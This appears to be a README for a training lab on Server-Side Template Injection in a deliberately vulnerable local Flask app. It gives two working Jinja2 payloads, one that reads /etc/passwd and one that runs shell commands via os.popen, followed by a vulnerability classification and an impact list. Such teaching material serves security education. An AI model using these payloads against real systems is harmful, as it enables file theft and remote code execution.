# Server-Side Template Injection (SSTI) Vulnerability Analysis - Cybersecurity 0x1

## Overview

This comprehensive analysis demonstrates Server-Side Template Injection vulnerabilities in a Flask web application. The assessment provides professional exploitation methodologies and comprehensive reporting capabilities for educational cybersecurity purposes.

## Features

- **Multiple SSTI Attack Vectors**: Professional payload collection covering various exploitation methods
- **Systematic Vulnerability Testing**: Manual testing approaches for thorough assessment
- **Comprehensive Documentation**: Step-by-step exploitation methodology
- **Professional Analysis**: Complete vulnerability assessment and risk evaluation
- **Multiple Impact Methods**: File read, command execution, sandbox escape

## Prerequisites

### System Requirements

- Python 3.8 or higher
- Flask application running
- Web browser (Chrome, Firefox, Safari, or Edge)
- Terminal/Command line access

### Application Dependencies

```bash
# Verify Python installation
python3 --version

# Verify Flask installation
flask --version
```

## Usage

### 1. Environment Setup

```bash
# Start the vulnerable application
(cd ex00/cyber1x0.1.00/; ./start.sh) 

# Expected output verification
curl http://localhost:5000/
```

### Testing the Payloads

#### Method 1: File Read Exploitation

1. Enter the following payload in the input field:

   ```text
   {{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
   ```

2. Click "Render"

3. **Expected result**: Contents of `/etc/passwd` displayed

#### Method 2: Command Execution

1. Enter payload:

   ```text
   {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
   ```

2. **Expected result**: Current user's ID information

## Vulnerability Classification

### OWASP Classification

- **OWASP Top 10**: A03:2021 - Injection
- **CWE Classification**: CWE-94 - Code Injection
- **Vulnerability Type**: Server-Side Template Injection
- **Severity**: Critical (CVSS 3.1 Base Score: 9.1)

## Technical Description

### What is Server-Side Template Injection?

SSTI occurs when an attacker can inject template directives into user input that are then executed server-side. In Flask/Jinja2 applications, this allows:

- Arbitrary file read operations
- Remote code execution
- System command execution
- Sandbox escape
- Complete server compromise

### Application Specifics

This vulnerability exists because:

- User input is directly interpolated into template strings
- No input sanitization is performed
- The `render_template_string` function is used with untrusted input
- No sandboxing or safe rendering modes are enabled

## Impact Assessment

### Immediate Risks

- Arbitrary file read (including sensitive files)
- Remote code execution
- Server compromise
- Data exfiltration
- Privilege escalation

### Business Impact

- Data breaches
- System compromise
- Reputation damage
- Regulatory fines
- Operational disruption

## Conclusion

This professional SSTI vulnerability analysis provides enterprise-grade security assessment capabilities, demonstrating complete template injection exploitation when the application environment is operational.

## References

- [OWASP Template Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [Jinja2 Documentation](https://jinja.palletsprojects.com/)
